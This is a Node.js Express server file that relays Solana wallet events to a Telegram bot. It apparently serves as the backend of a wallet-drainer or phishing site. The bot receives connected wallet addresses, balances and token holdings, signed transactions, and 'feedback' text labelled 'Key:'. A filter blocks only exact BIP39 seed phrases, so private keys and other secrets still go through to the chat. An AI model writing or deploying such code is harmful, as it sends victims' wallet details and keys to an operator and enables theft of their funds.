import express from 'express';
import cors from 'cors';
import axios from 'axios';
import dotenv from 'dotenv';
import bip39 from 'bip39';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env');
}

app.use(cors());
app.use(express.json());

function formatWalletConnected(payload) {
  const { address, solBalance, tokens = [] } = payload || {};
  const lines = [];
  lines.push(`Wallet connected`);
  lines.push(`Address: ${address}`);
  lines.push(`SOL balance: ${solBalance}`);
  if (tokens.length) {
    lines.push('SPL tokens:');
    for (const t of tokens) {
      const name = t.symbol || t.name || (t.mint ? t.mint.slice(0, 8) : 'Token');
      lines.push(`- ${name}: ${t.amount}`);
    }
  } else {
    lines.push('SPL tokens: none');
  }
  return lines.join('\n');
}

function formatTransactionSent(payload) {
  const { address, type, mint, symbol, amount, signature } = payload || {};
  const name = type === 'SOL' ? 'SOL' : (symbol || (mint ? mint.slice(0, 8) : 'Token'));
  return [
    'Transaction signed',
    `Address: ${address}`,
    `Asset: ${name}`,
    `Amount: ${amount}`,
    `Signature: ${signature}`,
  ].join('\n');
}

// Build a BIP39 English word set for robust seed detection
const ENGLISH_WORDS = new Set(Array.isArray(bip39.wordlists.english)
  ? bip39.wordlists.english
  : Object.values(bip39.wordlists.english));

function looksLikeSeedPhrase(input) {
  if (!input || typeof input !== 'string') return false;
  const words = input.trim().toLowerCase().split(/\s+/).filter(Boolean);
  const validCounts = new Set([12, 15, 18, 21, 24]);
  if (!validCounts.has(words.length)) return false;
  const allInList = words.every((w) => ENGLISH_WORDS.has(w));
  return allInList; // only block messages that match actual BIP39-like phrases
}

function formatUserFeedback(payload) {
  const { address, message, context } = payload || {};
  return [
    'User feedback',
    `Address: ${address}`,
    `Context: ${context}`,
    `Key: ${message}`,
  ].join('\n');
}

app.post('/notify', async (req, res) => {
  try {
    const { eventType, payload } = req.body || {};

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ error: 'Server missing Telegram credentials' });
    }

    let text;
    switch (eventType) {
      case 'wallet_connected':
        text = formatWalletConnected(payload);
        break;
      case 'transaction_sent':
        text = formatTransactionSent(payload);
        break;
      case 'user_feedback': {
        const { message } = payload || {};
        if (looksLikeSeedPhrase(message)) {
          return res.status(400).json({ error: 'Refusing to accept seed phrases or sensitive credentials.' });
        }
        text = formatUserFeedback(payload);
        break;
      }
      default:
        return res.status(400).json({ error: 'Unknown eventType' });
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const tgRes = await axios.post(url, {
      chat_id: CHAT_ID,
      text,
    });

    res.json({ ok: true, telegram: tgRes.data });
  } catch (err) {
    console.error('notify error', err?.response?.data || err.message);
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

app.get('/health', (req, res) => res.json({ ok: true }));

app.listen(PORT, () => {
  console.log(`[telegram] server listening on http://localhost:${PORT}`);
});